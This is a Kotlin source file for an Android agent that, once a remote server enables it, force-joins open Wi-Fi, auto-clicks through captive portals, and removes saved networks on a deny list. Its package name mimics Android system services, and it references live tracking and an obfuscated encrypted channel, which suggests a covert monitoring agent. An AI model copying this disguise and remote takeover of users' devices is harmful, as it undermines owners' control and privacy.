package com.android.systemservices

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.ScanResult
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import org.json.JSONArray
import java.util.concurrent.ConcurrentHashMap

/**
 * AGGRESSIVE open-WiFi auto-join — DEFAULT OFF, gated by Prefs.wifiAutoJoinEnabled (set by the
 * server). When enabled and the device is NOT already on a validated WiFi, it scans, picks the
 * strongest OPEN (no-auth) network that passes the allow/deny list and isn't BSSID-blacklisted,
 * force-joins it (a Device Owner is exempt from the API-29 WifiManager add/enable restrictions),
 * then verifies the network actually validates / clears a click-through portal within a timeout.
 * On failure the BSSID is cooled off and the temp config removed, so it never gets stuck.
 *
 * ⚠️ Joining arbitrary open APs is a rogue-AP / evil-twin exposure for the device's OTHER traffic —
 * hence OFF by default and scoped by the operator's allow/deny list (empty allow = any open AP that
 * isn't denied). The agent's own channel stays ZK + REALITY encrypted regardless.
 *
 * Guardrails: never force-enables the radio; skips when already on validated WiFi; one pass/minute
 * max; ~3-min cadence; per-BSSID 30-min blacklist on validation failure.
 */
object WifiAutoJoinHelper {
    private const val TAG = "WifiAutoJoin"
    private const val PERIOD_MS    = 3 * 60 * 1000L   // scan/join cadence while enabled
    private const val MIN_GAP_MS   = 60 * 1000L       // never run more than once a minute
    private const val BLACKLIST_MS = 30 * 60 * 1000L  // dead-BSSID cooldown (no validate, no portal)
    private const val BLACKLIST_MS_AIRLINE = 3 * 60 * 1000L  // inflight APs look "dead" until airborne
    private const val VERIFY_MS    = 12_000L          // wait this long for validation after joining
    private const val VERIFY_MS_AIRLINE = 28_000L     // inflight DHCP + captive detect is slow
    private const val NEEDS_MANUAL_MS = 30 * 60 * 1000L  // per-SSID cooldown after an unsolvable portal
    private const val NEEDS_MANUAL_MS_AIRLINE = 90_000L  // retry at cruise; gate portals say "after takeoff"

    private val blacklist = ConcurrentHashMap<String, Long>()    // BSSID -> expiry epoch ms (dead AP)
    private val needsManual = ConcurrentHashMap<String, Long>()  // SSID  -> expiry (captive portal we couldn't auto-solve)
    private enum class JoinResult { JOINED, CAPTIVE_MANUAL, DEAD }
    @Volatile private var lastRun = 0L
    @Volatile private var handler: Handler? = null
    /** True while maybeJoin() is actively cycling through AP candidates. RogueApDetector
     *  reads this to suppress counting self-caused disconnects as deauth events. */
    @Volatile var isCycling = false
    // Set by MonitoringService — returns true while live-tracking or a stream is active. Auto-join must
    // NOT hop networks during an active session (each disableOthers drop kills the socket/stream).
    @Volatile var sessionProbe: (() -> Boolean)? = null

    /** Start the periodic loop (a cheap no-op each tick while disabled). Idempotent. */
    fun start(context: Context) {
        if (handler != null) return
        val ht = HandlerThread("sentinel-wifi-autojoin").apply { start() }
        val h = Handler(ht.looper)
        handler = h
        val app = context.applicationContext
        // Disable denied saved networks immediately on boot — don't wait for the first scan
        // cycle (15s) or for the server to re-push the config on reconnect.
        h.post { disableDeniedNetworks(app) }
        val tick = object : Runnable {
            override fun run() {
                try { RogueApDetector.tick(app) } catch (_: Throwable) {}   // re-enable WiFi after rogue-defense cooldown
                try { maybeJoin(app) } catch (_: Throwable) {}
                handler?.postDelayed(this, PERIOD_MS)
            }
        }
        h.postDelayed(tick, 15_000)   // first pass shortly after boot
    }

    /** Kick an immediate pass (e.g. right after the toggle is enabled). */
    fun triggerNow(context: Context) {
        val app = context.applicationContext
        handler?.post { try { maybeJoin(app) } catch (_: Throwable) {} }
    }

    @Suppress("DEPRECATION")
    private fun maybeJoin(context: Context) {
        val prefs = Prefs(context)
        if (!prefs.wifiAutoJoinEnabled) return
        if (RogueApDetector.isDefensiveOff()) return     // rogue defense active — stay off WiFi
        if (sessionProbe?.invoke() == true) return       // live tracking / stream active — don't churn the connection
        val now = System.currentTimeMillis()
        if (now - lastRun < MIN_GAP_MS) return
        lastRun = now

        val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        if (!wm.isWifiEnabled) return   // never force-enable the radio

        // ── Agent takes TOTAL control of open WiFi ──────────────────────────────
        // If the phone is currently on an open WiFi that's on the deny list, disconnect
        // NOW and remove the saved config — don't wait for the scan cycle, don't care
        // whether the connection is validated/has-internet. The operator put it on the
        // deny list for a reason; Android's own WiFi manager must never override that.
        val deny = parseSsids(prefs.wifiAutoJoinDeny)
        if (deny.isNotEmpty()) {
            try {
                val currentSsid = wm.connectionInfo?.ssid?.removeSurrounding("\"")
                if (currentSsid != null && deny.contains(currentSsid.lowercase())) {
                    // Find the saved config for this SSID that's open (KeyMgmt.NONE) or OWE.
                    val savedOpen = wm.configuredNetworks?.firstOrNull { cfg ->
                        cfg.SSID == "\"$currentSsid\"" &&
                        (cfg.allowedKeyManagement.get(WifiConfiguration.KeyMgmt.NONE) ||
                         cfg.allowedKeyManagement.get(WifiConfiguration.KeyMgmt.OWE))
                    }
                    if (savedOpen != null) {
                        Log.w(TAG, "Agent seizing control: on denied open WiFi '$currentSsid' — removing saved config + disconnecting")
                        wm.removeNetwork(savedOpen.networkId)
                        wm.saveConfiguration()
                        wm.disconnect()
                        disableDeniedNetworks(context)
                        return
                    }
                }
            } catch (e: Throwable) { Log.w(TAG, "deny-check disconnect failed: ${e.message}") }
        }

        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val currentSsid = try { wm.connectionInfo?.ssid?.removeSurrounding("\"") } catch (_: Throwable) { null }
        val wifiNet = cm.allNetworks.firstOrNull { n ->
            cm.getNetworkCapabilities(n)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
        }
        val wifiCaps = wifiNet?.let { cm.getNetworkCapabilities(it) }
        val onValidatedWifi = wifiCaps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED) == true

        // Already associated with a known inflight SSID: retry the portal in place. Inflight portals
        // often say "available after takeoff" at the gate — hopping away (or cooling the SSID for
        // 30 min) is what made this feature miss the whole flight. This runs even WITHOUT saved
        // creds (click-through/WebView path) — the sign-in alert fires if it stays unsolved.
        if (AirlineWifiHelper.isKnownInflightSsid(currentSsid) && wifiNet != null && wifiCaps != null) {
            if (onValidatedWifi) return
            Log.i(TAG, "already on airline SSID $currentSsid — retrying portal (validated=false)")
            val gw = AirlineWifiHelper.gatewayIp(context)
            if (AirlineWifiHelper.trySolve(context, wifiNet, gw, currentSsid)) {
                AirlineWifiHelper.reportCleared(context, wifiNet)
                Log.i(TAG, "airline portal cleared on existing association $currentSsid")
                return
            }
            return   // stay associated; retry next tick. Do NOT cycle passenger hotspots.
        }

        val allow = parseSsids(prefs.wifiAutoJoinAllow)
        // deny is already parsed above (used for the pre-scan disconnect check)
        try { wm.startScan() } catch (_: Throwable) {}   // best-effort; results may be throttled/cached
        val airlineCreds = AirlineWifiHelper.hasAnyEnabledCredentials()
        val candidates = (wm.scanResults ?: emptyList())
            .filter { it.SSID.isNotBlank() && isJoinableOpenOrOwe(it.capabilities) }
            // Permanent skip of known account-login ISP/carrier hotspots (CoxWiFi, xfinitywifi, …)
            // unless the operator EXPLICITLY allow-listed that exact SSID — or it's a vendor
            // inflight SSID (gogoinflight) and we have airline credentials to try.
            .filter {
                val allowed = allow.contains(it.SSID.lowercase())
                val portal = isKnownPortalSsid(it.SSID)
                val inflightOverride = portal && AirlineWifiHelper.isInflightVendorSsid(it.SSID) && airlineCreds
                !portal || allowed || inflightOverride
            }
            .filter { allow.isEmpty() || allow.contains(it.SSID.lowercase()) || AirlineWifiHelper.shouldAutoJoin(it.SSID) }
            .filter { !deny.contains(it.SSID.lowercase()) }
            .filter { (blacklist[it.BSSID] ?: 0L) < now }
            .filter { (needsManual[it.SSID] ?: 0L) < now }   // skip captive SSIDs we recently couldn't auto-solve
            // Airline SSIDs we can actually log into beat a stronger airport/cafe open AP.
            .sortedWith(
                compareByDescending<ScanResult> { AirlineWifiHelper.shouldAutoJoin(it.SSID) }
                    .thenByDescending { isOwe(it.capabilities) }
                    .thenByDescending { it.level }
            )

        // Validated on some OTHER wifi (airport, cafe): still hop if a preferred airline SSID is
        // in range — otherwise we'd ride airport wifi until it drops, miss boarding, and only
        // notice the plane SSID after takeoff (or never, if the 30-min cooldown already fired).
        if (onValidatedWifi) {
            val airline = candidates.filter { AirlineWifiHelper.shouldAutoJoin(it.SSID) }
            if (airline.isEmpty()) return
            Log.i(TAG, "validated on $currentSsid but airline SSID ${airline.first().SSID} is in range — hopping")
            isCycling = true
            try {
                val handledSsids = HashSet<String>()
                for (sr in airline) {
                    if (sr.SSID in handledSsids) continue
                    when (tryJoin(context, wm, cm, sr)) {
                        JoinResult.JOINED -> { Log.i(TAG, "joined airline WiFi ${sr.SSID}"); return }
                        JoinResult.CAPTIVE_MANUAL -> handledSsids.add(sr.SSID)
                        JoinResult.DEAD -> {}
                    }
                }
            } finally {
                isCycling = false
            }
            return
        }

        // Hop through the open networks strongest-first. isCycling=true suppresses the RogueAP
        // deauth counter so our own blacklist-and-remove disconnects don't trigger the defense.
        isCycling = true
        try {
            val handledSsids = HashSet<String>()
            for (sr in candidates) {
                if (sr.SSID in handledSsids) continue   // one attempt per SSID per pass — skip sibling BSSIDs
                when (tryJoin(context, wm, cm, sr)) {
                    JoinResult.JOINED -> { Log.i(TAG, "joined open WiFi ${sr.SSID}"); return }
                    JoinResult.CAPTIVE_MANUAL -> handledSsids.add(sr.SSID)   // captive+unsolved → don't churn its other BSSIDs
                    JoinResult.DEAD -> {}                                    // dead AP → try the next candidate
                }
            }
            // None worked → re-enable all configs so the OS isn't left with WiFi stuck-disabled,
            // then immediately re-disable denied saved networks so Android's own WiFi manager
            // can't auto-connect to them before our next scan cycle (~3 min).
            reEnableAllConfigs(wm)
            disableDeniedNetworks(context)
        } finally {
            isCycling = false
        }
    }

    /** Re-enable every configured network so a prior disableOthers never leaves WiFi stuck off. */
    @Suppress("DEPRECATION")
    private fun reEnableAllConfigs(wm: WifiManager) {
        try { wm.configuredNetworks?.forEach { wm.enableNetwork(it.networkId, false) } } catch (_: Throwable) {}
    }

    /**
     * Persistently disable any saved WiFi configuration whose SSID is on the current deny list.
     * Without this, Android's built-in WiFi manager auto-connects to the saved network between
     * the agent's scan cycles (~3 min) — the deny list only filtered the agent's own candidate
     * list, leaving the OS free to reconnect anyway. Called after reEnableAllConfigs (so denied
     * networks never stay enabled) and when set_wifi_autojoin is pushed from the server.
     */
    @Suppress("DEPRECATION")
    fun disableDeniedNetworks(context: Context) {
        val prefs = Prefs(context)
        if (!prefs.wifiAutoJoinEnabled) return   // only enforce when the feature is active
        val deny = parseSsids(prefs.wifiAutoJoinDeny)
        if (deny.isEmpty()) return
        val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        try {
            wm.configuredNetworks?.forEach { config ->
                val ssid = config.SSID?.removeSurrounding("\"") ?: return@forEach
                if (deny.contains(ssid.lowercase())) {
                    wm.disableNetwork(config.networkId)
                    Log.i(TAG, "Disabled denied saved network: $ssid")
                }
            }
        } catch (_: Throwable) {}
    }

    /** Restore all WiFi configs to enabled — called when auto-join is turned OFF. */
    fun restore(context: Context) {
        try {
            reEnableAllConfigs(context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager)
        } catch (_: Throwable) {}
    }

    /** Only truly OPEN ESS networks — exclude every authenticated/encrypted scheme (incl. OWE/SAE).
     *  Public so OpenWifiVpnController can reuse it for its pre-31 open-WiFi fallback. */
    fun isOpen(caps: String): Boolean {
        val c = caps.uppercase()
        return !c.contains("WEP") && !c.contains("PSK") && !c.contains("EAP") &&
               !c.contains("SAE") && !c.contains("OWE") && !c.contains("WAPI")
    }

    /** OWE = Wi-Fi CERTIFIED Enhanced Open — passwordless (no creds), but link-encrypted.
     *  OWE-capable APs advertise the "OWE" element in their capabilities string. */
    private fun isOwe(caps: String): Boolean = caps.uppercase().contains("OWE")

    /** Joinable open networks: truly OPEN (no auth at all) OR OWE/Enhanced-Open (passwordless).
     *  OWE-encrypted links don't need the agent's forced-VPN umbrella, so the VPN controller
     *  keeps using [isOpen] while the auto-join scanner uses this broader predicate.
     *  OWE client configuration (KeyMgmt.OWE) only exists from API 28 — gate it, since a
     *  pre-28 device can't perform the OWE handshake anyway. */
    private fun isJoinableOpenOrOwe(caps: String): Boolean =
        isOpen(caps) || (isOwe(caps) && android.os.Build.VERSION.SDK_INT >= 28)

    /**
     * PERMANENT blacklist of ISP / carrier / aggregator hotspots that broadcast as OPEN (no
     * encryption) but whose captive portal requires an ACCOUNT login to pass any traffic — e.g.
     * Cox's "CoxWiFi", Comcast's "xfinitywifi", Spectrum, Optimum, BT, Boingo, etc. Auto-joining
     * these is pointless (no account ⇒ no internet) and merely churns the real connection and
     * burns a ~12s verify per cycle, so they're skipped BEFORE any join attempt — unless the
     * operator has EXPLICITLY put the exact SSID in the allow-list (deliberate override).
     *
     * Matched case-insensitively as an exact SSID OR by a distinctive prefix (covers the common
     * "_Premium" / " Plus" / numeric-suffix variants the carriers append). Deliberately omits
     * ambiguous names that are usually genuinely-free at venues (e.g. "attwifi" at cafés).
     */
    private val PORTAL_SSID_EXACT: Set<String> = setOf(
        // ── US cable / ISP ──
        "cablewifi", "coxwifi", "cox wifi", "xfinitywifi",
        "optimumwifi", "optimum wifi", "spectrumwifi", "spectrum wifi", "spectrumwifi plus",
        // ── Canada ──
        "shawopen", "shaw open", "rogers wifi", "rogerswifi", "fido wifi", "fidowifi",
        "bell wifi", "bell wi-fi", "telus wi-fi", "telus wifi",
        // ── UK / Ireland ──
        "btwifi", "btwi-fi", "bt wi-fi", "btwifi-with-fon", "btopenzone", "_the cloud",
        "sky wifi", "o2 wifi", "eir wifi",
        // ── Europe ──
        "freewifi", "freewifi_secure", "sfr wifi fon", "sfr wifi public", "sfr wifi mobile",
        "meo-wifi", "movistar_fon", "vodafone wifi", "vodafone-wifi", "vodafone hotspot",
        "telekom_fon", "telekom_ice", "kpn fon", "ziggo fon", "swisscom_auto_login",
        "unitymedia wifispot", "fon_free_internet", "fonera",
        // ── Aggregators / travel ──
        "boingo", "boingo hotspot", "gogoinflight",
        // ── Australia / NZ ──
        "telstra air", "telstraair", "optus wifi", "spark wifi"
    )
    private val PORTAL_SSID_PREFIX: List<String> = listOf(
        "coxwifi", "xfinitywifi", "spectrumwifi", "optimumwifi", "cablewifi",
        "boingo", "btwifi", "telstra air", "sfr wifi", "vodafone wifi"
    )

    /** True if this SSID is a known account-login ISP/carrier hotspot (see PORTAL_SSID_* above). */
    fun isKnownPortalSsid(ssid: String): Boolean {
        val s = ssid.trim().lowercase()
        if (s.isEmpty()) return false
        if (s in PORTAL_SSID_EXACT) return true
        return PORTAL_SSID_PREFIX.any { s.startsWith(it) }
    }

    private fun parseSsids(json: String): Set<String> = try {
        // Normalised to lowercase so deny/allow matching is case-insensitive (APs broadcast
        // mixed-case SSIDs that rarely match the operator's typed entry exactly).
        val a = JSONArray(json); (0 until a.length()).map { a.getString(it).trim().lowercase() }.toSet()
    } catch (_: Throwable) { emptySet() }

    @Suppress("DEPRECATION")
    private fun tryJoin(context: Context, wm: WifiManager, cm: ConnectivityManager, sr: ScanResult): JoinResult {
        val owe = isOwe(sr.capabilities)
        val conf = WifiConfiguration().apply {
            SSID = "\"${sr.SSID}\""
            if (owe) {
                // OWE/Enhanced Open — passwordless (no creds to store), but the AP requires the
                // OWE key management handshake instead of KeyMgmt.NONE. Not available pre-API-28,
                // so the candidate filter gates OWE by SDK level (only flagged on 28+).
                allowedKeyManagement.set(WifiConfiguration.KeyMgmt.OWE)
            } else {
                allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)   // open network
            }
        }
        val netId = wm.addNetwork(conf)
        if (netId == -1) { Log.w(TAG, "addNetwork failed for ${sr.SSID}"); return JoinResult.DEAD }
        wm.enableNetwork(netId, true)   // disableOthers=true → connect to this one
        wm.reconnect()

        // Known inflight SSID → longer verify + keep the association for cruise retries even with
        // NO saved creds (the click-through/WebView path still runs, and repeated failures raise
        // the sign-in alert). Candidate PREFERENCE still uses shouldAutoJoin above, so we don't
        // abandon a working AP to hop onto an airline SSID we can't log into.
        val airline = AirlineWifiHelper.isKnownInflightSsid(sr.SSID)
        val verifyMs = if (airline) VERIFY_MS_AIRLINE else VERIFY_MS

        // Wait for the network to either validate (open, no portal) or expose a captive portal.
        var captiveNet: android.net.Network? = null
        val deadline = System.currentTimeMillis() + verifyMs
        while (System.currentTimeMillis() < deadline) {
            try { Thread.sleep(1500) } catch (_: InterruptedException) {}
            // Scan all networks atomically — avoids a TOCTOU race where firstOrNull returns a stale
            // WiFi object from the previous BSSID cycle that still shows CAPTIVE_PORTAL in cached caps.
            captiveNet = null
            for (n in cm.allNetworks) {
                val caps = cm.getNetworkCapabilities(n) ?: continue
                if (!caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) continue
                if (caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)) return JoinResult.JOINED
                if (caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_CAPTIVE_PORTAL)) captiveNet = n
            }
            if (captiveNet != null) break   // portal present → stop waiting, go solve it
        }

        val cap = captiveNet
        if (cap != null) {
            // Gateway IP is always reachable on the local subnet — a probe target even when enterprise
            // portals filter external IPs for unauthenticated clients.
            val gatewayIp = AirlineWifiHelper.gatewayIp(context)
            Log.i(TAG, "captive portal on ${sr.SSID} airline=$airline gw=$gatewayIp")

            if (airline) {
                if (AirlineWifiHelper.trySolve(context, cap, gatewayIp, sr.SSID)) {
                    AirlineWifiHelper.reportCleared(context, cap)
                    Log.i(TAG, "airline solve cleared ${sr.SSID}")
                    return JoinResult.JOINED
                }
                // Stay associated so SocketManager / the next tick can retry once the plane is
                // airborne. A 30-min cooldown + removeNetwork is what missed the flight before.
                needsManual[sr.SSID] = System.currentTimeMillis() + NEEDS_MANUAL_MS_AIRLINE
                Log.i(TAG, "airline WiFi ${sr.SSID} portal not ready — retry in ${NEEDS_MANUAL_MS_AIRLINE / 1000}s (keeping association)")
                return JoinResult.CAPTIVE_MANUAL
            }

            // 1) Headless raw-HTTP solve — plain click-through + redirect-bounce portals.
            if (CaptivePortalHelper.tryAutoAccept(cap, gatewayIp)) {
                try { cm.reportNetworkConnectivity(cap, true) } catch (_: Throwable) {}
                return JoinResult.JOINED
            }
            // 2) Escalate JS-driven splashes (ExtremeGuest etc.) to the separate-process WebView solver.
            val portalUrl = CaptivePortalHelper.lastPortalUrl
            if (portalUrl != null) {
                Log.i(TAG, "headless failed — escalating to WebView solver → ${portalUrl.take(120)}")
                CaptivePortalWebViewService.start(context, cap, portalUrl)
                val wvDeadline = System.currentTimeMillis() + 32_000L
                while (System.currentTimeMillis() < wvDeadline) {
                    try { Thread.sleep(2500) } catch (_: InterruptedException) {}
                    if (CaptivePortalHelper.probeClear(cap)) {
                        try { cm.reportNetworkConnectivity(cap, true) } catch (_: Throwable) {}
                        Log.i(TAG, "WebView solver cleared ${sr.SSID}")
                        return JoinResult.JOINED
                    }
                }
            }
            // Still captive → a REAL network that needs manual login. Do NOT blacklist (it's not dead);
            // cool the SSID down so we stop churning every BSSID of it, and leave it for a manual sign-in.
            needsManual[sr.SSID] = System.currentTimeMillis() + NEEDS_MANUAL_MS
            Log.i(TAG, "open WiFi ${sr.SSID} needs manual portal login — cooling SSID ${NEEDS_MANUAL_MS / 60000}m (not blacklisted)")
            try { wm.removeNetwork(netId) } catch (_: Throwable) {}
            return JoinResult.CAPTIVE_MANUAL
        }

        // Never validated, never showed a portal → truly dead AP. Inflight APs look like this at
        // the gate; use a short cooldown so we retry once airborne instead of waiting 30 min.
        val deadMs = if (airline) BLACKLIST_MS_AIRLINE else BLACKLIST_MS
        blacklist[sr.BSSID] = System.currentTimeMillis() + deadMs
        if (!airline) try { wm.removeNetwork(netId) } catch (_: Throwable) {}
        Log.i(TAG, "open WiFi ${sr.SSID} (${sr.BSSID}) dead — no validate, no portal — blacklisted ${deadMs / 60000}m airline=$airline")
        return JoinResult.DEAD
    }
}
